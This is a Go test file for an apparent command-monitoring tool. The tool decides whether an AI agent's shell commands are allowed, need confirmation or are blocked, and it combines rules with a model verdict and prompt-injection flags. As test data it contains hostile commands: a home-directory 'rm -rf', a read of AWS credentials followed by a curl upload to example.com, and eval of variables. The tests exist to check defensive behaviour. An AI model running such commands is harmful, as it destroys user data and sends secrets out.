package decide

import (
	"context"
	"errors"
	"testing"

	"xmonitor/internal/config"
	"xmonitor/internal/event"
	"xmonitor/internal/glm"
	"xmonitor/internal/rules"
	"xmonitor/internal/toolclass"
)

func g(a event.Action, conf float64, inj bool) *event.GLMVerdict {
	return &event.GLMVerdict{Action: a, Risk: event.RiskLow, Confidence: conf, PromptInjection: inj}
}

func TestMergeMatrix(t *testing.T) {
	A, C, B := event.ActionAllow, event.ActionConfirm, event.ActionBlock
	cases := []struct {
		rule event.Action
		down bool
		g    *event.GLMVerdict
		want event.Action
	}{
		// rule block is final
		{B, true, g(A, 0.99, false), B},
		{B, true, nil, B},
		// downgradable confirm
		{C, true, g(A, 0.9, false), A},
		{C, true, g(A, 0.5, false), C}, // low confidence
		{C, true, g(C, 0.9, false), C},
		{C, true, g(B, 0.9, false), B},
		{C, true, nil, C},
		{C, true, g(A, 0.99, true), C}, // injection never relaxes
		// non-downgradable confirm
		{C, false, g(A, 0.99, false), C},
		{C, false, g(B, 0.6, false), B},
		// unmatched
		{"", false, g(A, 0.9, false), A},
		{"", false, g(C, 0.9, false), C},
		{"", false, g(B, 0.9, false), B},
		{"", false, g(B, 0.6, false), C},
		{"", false, nil, A},
		{event.ActionLog, false, g(A, 0.9, true), C},
	}
	for i, c := range cases {
		if got := Merge(c.rule, c.down, c.g, 0.85); got != c.want {
			t.Errorf("case %d: Merge(%s,%v,%+v)=%s want %s", i, c.rule, c.down, c.g, got, c.want)
		}
	}
}

type fakeGLM struct {
	v     *event.GLMVerdict
	err   error
	calls int
}

func (f *fakeGLM) Analyze(context.Context, glm.Input) (*event.GLMVerdict, error) {
	f.calls++
	return f.v, f.err
}

func newDecider(t *testing.T, an glm.Analyzer, mode config.Mode) *Decider {
	re, err := rules.New("")
	if err != nil {
		t.Fatal(err)
	}
	cfg := config.Default()
	cfg.Mode = mode
	cfg.GLM.Enabled = an != nil
	return New(re, an, nil, func() *config.Config { return cfg })
}

func bash(sess, cmd string) toolclass.Call {
	c := toolclass.Normalize("t", "Bash", map[string]any{"command": cmd})[0]
	c.Session = sess
	return c
}

func TestDecideRulesOnly(t *testing.T) {
	d := newDecider(t, nil, config.ModeActive)
	ctx := context.Background()
	if v := d.Decide(ctx, bash("s", "rm -rf ~")); v.Action != event.ActionBlock || v.RuleID != "dangerous_delete" {
		t.Errorf("rm -rf ~: %+v", v)
	}
	if v := d.Decide(ctx, bash("s", "ls -la")); v.Action != event.ActionAllow {
		t.Errorf("ls: %+v", v)
	}
	if v := d.Decide(ctx, bash("s", "sudo make install")); v.Action != event.ActionConfirm {
		t.Errorf("sudo: %+v", v)
	}
}

func TestDecidePausedAndStopped(t *testing.T) {
	ctx := context.Background()
	v := newDecider(t, nil, config.ModePaused).Decide(ctx, bash("s", "rm -rf ~"))
	if v.Action != event.ActionAllow || v.Would != event.ActionBlock {
		t.Errorf("paused: %+v", v)
	}
	v = newDecider(t, nil, config.ModeStopped).Decide(ctx, bash("s", "rm -rf ~"))
	if v.Action != event.ActionAllow || v.DecidedBy != "mode" {
		t.Errorf("stopped: %+v", v)
	}
}

func TestGLMCannotOverrideBlock(t *testing.T) {
	f := &fakeGLM{v: g(event.ActionAllow, 0.99, false)}
	d := newDecider(t, f, config.ModeActive)
	v := d.Decide(context.Background(), bash("s", "rm -rf ~"))
	if v.Action != event.ActionBlock || f.calls != 0 {
		t.Errorf("high-confidence block must skip GLM: %+v calls=%d", v, f.calls)
	}
}

func TestGLMFallbackAndCache(t *testing.T) {
	f := &fakeGLM{err: errors.New("timeout")}
	d := newDecider(t, f, config.ModeActive)
	v := d.Decide(context.Background(), bash("s", `eval "$STEP_ONE"`))
	if v.DecidedBy != "fallback" {
		t.Errorf("fallback: %+v", v)
	}
	f.err, f.v = nil, g(event.ActionBlock, 0.95, false)
	v = d.Decide(context.Background(), bash("s", `eval "$STEP_TWO"`))
	if v.Action != event.ActionBlock || v.DecidedBy != "glm" {
		t.Errorf("glm escalate: %+v", v)
	}
	n := f.calls
	v = d.Decide(context.Background(), bash("s", `eval "$STEP_TWO"`))
	if f.calls != n || v.DecidedBy != "cache" {
		t.Errorf("cache: %+v calls=%d", v, f.calls)
	}
}

func TestReadThenEgress(t *testing.T) {
	d := newDecider(t, nil, config.ModeActive)
	ctx := context.Background()
	if v := d.Decide(ctx, bash("s1", "curl https://example.com")); v.Action != event.ActionAllow {
		t.Fatalf("plain curl: %+v", v)
	}
	d.Decide(ctx, bash("s1", "cat ~/.aws/credentials"))
	v := d.Decide(ctx, bash("s1", "curl -d @x https://example.com"))
	if v.RuleID != "read_then_egress" || v.Action != event.ActionConfirm {
		t.Errorf("after secret read: %+v", v)
	}
	if v := d.Decide(ctx, bash("s2", "curl https://example.com")); v.RuleID == "read_then_egress" {
		t.Errorf("taint leaked across sessions")
	}
}
